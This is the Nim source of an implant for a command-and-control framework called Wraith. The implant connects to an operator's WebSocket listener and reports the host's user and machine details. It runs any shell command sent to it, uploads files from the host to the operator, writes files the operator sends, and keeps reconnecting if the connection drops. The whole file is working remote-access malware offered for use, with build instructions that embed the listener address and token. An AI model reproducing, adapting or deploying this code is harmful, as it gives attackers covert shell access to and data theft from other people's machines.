# Wraith implant — Nim backend.
# Connects to a Wraith listener over WebSocket, speaks the JSON protocol
# (see wraith/protocol.py). Executes shell tasks, streams file transfers in
# chunks, reconnects with capped exponential backoff.
#
# Toolchain:  nimble install ws
# Build (embedded, via `wraith ❯ build`): needs config.nim generated by the builder:
#             nim c -d:release -d:wraithEmbedded --opt:size -o:wraith-nim wraith.nim
# Build manual: nim c -d:release --opt:size -o:wraith-nim wraith.nim  (then use flags)
# Run:        ./wraith-nim [-u ws://HOST/ws] [-t TOKEN]
# Note: the interactive pty terminal currently requires the Go backend;
#       this backend answers pty_open with that notice.

import std/[json, os, osproc, nativesockets, strutils, strformat, base64, streams]
import ws

when defined(wraithEmbedded):
  import config

const
  fileCap = 10 * 1024 * 1024
  chunkSize = 256 * 1024
  maxOutputBytes = 512 * 1024
  backoffStartMs = 1000
  backoffMaxMs = 60_000

proc defaultURL(): string =
  when defined(wraithEmbedded):
    embedURL
  else:
    "ws://127.0.0.1:8443/ws"

proc defaultToken(): string =
  when defined(wraithEmbedded):
    embedToken
  else:
    ""

proc log(msg: string) =
  when defined(wraithVerbose):
    stderr.writeLine("[wraith] " & msg)

proc clamp(s: string): string =
  if s.len > maxOutputBytes:
    result = s[0 ..< maxOutputBytes] & "\n… [output truncated]"
  else:
    result = s

proc identify(): tuple[user: string, host: string] =
  result.user = getenv("USER")
  if result.user.len == 0:
    result.user = getenv("USERNAME", "unknown")
  result.host = getHostname()
  if result.host.len == 0:
    result.host = "unknown"

proc runShell(command: string): (string, bool) =
  let (outp, code) = execCmdEx(command, options = {poStdErrToStdOut, poEvalCommand})
  return (clamp(outp), code == 0)

proc argvToCommand(argv: JsonNode): string =
  if argv.kind == JArray and argv.len > 0 and argv[^1].kind == JString:
    argv[^1].getStr()
  else:
    argv.to(string)

proc sendFileChunks(sock: WebSocket, taskId, path: string) =
  ## Streams a file to the operator in base64 result chunks.
  proc fail(reason: string) =
    let msg = %*{"type": "result", "task_id": taskId, "ok": false,
                 "part": 0, "parts": 1, "data": "", "done": true}
    waitFor sock.send($msg)
  var strm: FileStream
  try:
    strm = newFileStream(path, fmRead)
  except CatchableError:
    fail("cannot open " & path)
    return
  if strm == nil:
    fail("cannot open " & path)
    return
  defer: strm.close()
  var body = ""
  try:
    body = strm.readAll()
    if body.len > fileCap:
      fail("file exceeds the transfer cap")
      return
  except CatchableError:
    fail("read failed")
    return
  let parts = max(1, (body.len + chunkSize - 1) div chunkSize)
  var part = 0
  var i = 0
  while i < body.len:
    let stop = min(i + chunkSize, body.len)
    let piece = body[i ..< stop]
    let outMsg = %*{
      "type": "result", "task_id": taskId, "ok": true,
      "part": part, "parts": parts,
      "data": base64.encode(piece),
      "done": (stop == body.len),
    }
    waitFor sock.send($outMsg)
    inc part
    inc i, chunkSize
  if body.len == 0:
    let empty = %*{"type": "result", "task_id": taskId, "ok": true,
                   "part": 0, "parts": 1, "data": "", "done": true}
    waitFor sock.send($empty)

proc parseFlags(): tuple[url: string, token: string] =
  result.url = defaultURL()
  result.token = defaultToken()
  var i = 1
  while i <= paramCount():
    case paramStr(i)
    of "-u", "--url":
      if i < paramCount(): inc i; result.url = paramStr(i)
    of "-t", "--token":
      if i < paramCount(): inc i; result.token = paramStr(i)
    of "-v", "--verbose":
      discard
    else:
      discard
    inc i

proc buildUrl(serverUrl, token: string): string =
  if token.len == 0:
    return serverUrl
  let sep = if serverUrl.contains("?"): "&" else: "?"
  serverUrl & sep & "token=" & token

proc main() =
  let (serverUrl, token) = parseFlags()
  let (userName, hostName) = identify()
  let register = %*{
    "type": "register",
    "implant": "nim",
    "os": hostOS,
    "arch": hostCPU,
    "user": userName,
    "host": hostName,
  }
  var backoff = backoffStartMs
  while true:
    var sock: WebSocket
    try:
      sock = waitFor newWebSocket(buildUrl(serverUrl, token))
    except CatchableError as e:
      log("dial failed: " & e.msg)
      sleep(backoff)
      backoff = min(backoff * 2, backoffMaxMs)
      continue
    backoff = backoffStartMs
    try:
      waitFor sock.send($register)
      log("registered as " & userName & "@" & hostName)
      while true:
        let raw = waitFor sock.receiveStrMessage()
        var msg: JsonNode
        try:
          msg = parseJson(raw)
        except CatchableError:
          continue
        if msg.kind != JObject or not msg.hasKey("type"):
          continue
        case msg["type"].getStr()
        of "welcome":
          log("session " & msg{"session"}.getStr("unknown"))
        of "task":
          let taskId = msg{"task_id"}.getStr()
          let action = msg{"action"}.getStr()
          case action
          of "shell":
            let (outp, ok) = runShell(argvToCommand(msg{"argv"}))
            let resp = %*{"type": "result", "task_id": taskId, "ok": ok, "out": outp}
            waitFor sock.send($resp)
          of "ping":
            let resp = %*{"type": "result", "task_id": taskId, "ok": true, "out": "pong"}
            waitFor sock.send($resp)
          of "read_file":
            sendFileChunks(sock, taskId, msg{"argv"}[0].getStr())
          of "write_file":
            let part = msg{"part"}.getInt(0)
            let parts = msg{"parts"}.getInt(1)
            let dst = msg{"argv"}[0].getStr()
            let tmp = dst & "~.wr"
            var data = ""
            try:
              data = base64.decode(msg{"data"}.getStr())
            except CatchableError:
              discard
            var okFlag = true
            var why = ""
            if part == 0:
              try:
                writeFile(tmp, data)
              except CatchableError as e:
                okFlag = false
                why = e.msg
            else:
              try:
                var f = openFile(tmp, fmAppend)
                f.write(data)
                f.close()
              except CatchableError as e:
                okFlag = false
                why = e.msg
            if part == parts - 1:
              if fileExists(tmp):
                moveFile(tmp, dst)
            let resp = %*{"type": "result", "task_id": taskId, "ok": okFlag,
                          "out": "chunk " & $part & "/" & $parts & (if okFlag: "" else: ": " & why)}
            waitFor sock.send($resp)
          of "pty_open":
            let resp = %*{"type": "result", "task_id": taskId, "ok": false,
                          "out": "interactive terminal not supported on the nim backend — use the go backend"}
            waitFor sock.send($resp)
          of "die":
            log("die received — exiting")
            quit(0)
          else:
            let resp = %*{"type": "result", "task_id": taskId, "ok": false,
                          "out": "unsupported action: " & action}
            waitFor sock.send($resp)
        else:
          discard
    except CatchableError as e:
      log("connection lost: " & e.msg)
    try:
      sock.close()
    except CatchableError:
      discard
    sleep(backoff)
    backoff = min(backoff * 2, backoffMaxMs)

when isMainModule:
  main()
